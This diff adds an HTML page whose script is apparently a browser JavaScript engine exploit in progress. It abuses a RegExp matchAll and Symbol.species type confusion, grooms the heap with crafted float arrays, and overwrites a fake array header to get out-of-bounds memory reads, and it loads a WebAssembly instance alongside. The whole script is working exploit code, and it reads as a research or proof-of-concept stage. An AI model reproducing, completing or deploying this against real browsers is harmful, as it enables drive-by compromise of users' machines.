@@ -1,0 +1,64 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P21</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1080011,MAXS=0x7fdffffe;
+const dbl=new Array(0x8000);for(let i=0;i<dbl.length;i++)dbl[i]=10.125+i*0.001;
+const obj=new Array(0x8000);for(let i=0;i<obj.length;i++)obj[i]=null;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
+  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
+const sk=[];
+function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+log("UA: "+navigator.userAgent);
+trash(230);trash(230);
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+spray();spray();spray();
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  const d=[];
+  for(let k=0;k<4;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");}}
+  log("D: "+d.join(","));
+  // Find header
+  const target=0x7fdffffe01080011n;
+  let hdr=-1;
+  for(let k=0x7FF0;k<=0x800F;k++){
+    try{if(f2i(m[k])===target){hdr=k;break;}}catch(e){break;}
+  }
+  if(hdr>=0){
+    log("HDR@"+hdr.toString(16));
+    // Self-modify: redirect to PIN-8 to read the FDA header
+    m[hdr]=i2f((BigInt(MAXS)<<32n)|0x1080009n);
+    // m[0] now reads cage+0x1080010 (map+length of object at PIN)
+    const v0=f2i(m[0]);
+    const map32=Number(v0&0xffffffffn);
+    const len32=Number(v0>>32n);
+    log("MAP:"+map32.toString(16)+" LEN:"+len32.toString(16));
+    // m[1] = cage+0x1080018 = verify (should match original m[0])
+    log("V1:"+f2i(m[1]).toString(16));
+    // m[2] = cage+0x1080020
+    log("V2:"+f2i(m[2]).toString(16));
+    // DON'T scan further - just these 3 reads
+  }else{
+    log("NO_HDR");
+  }
+  log("W: "+wasmI.exports.f());
+}else{log("NO_ARR");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
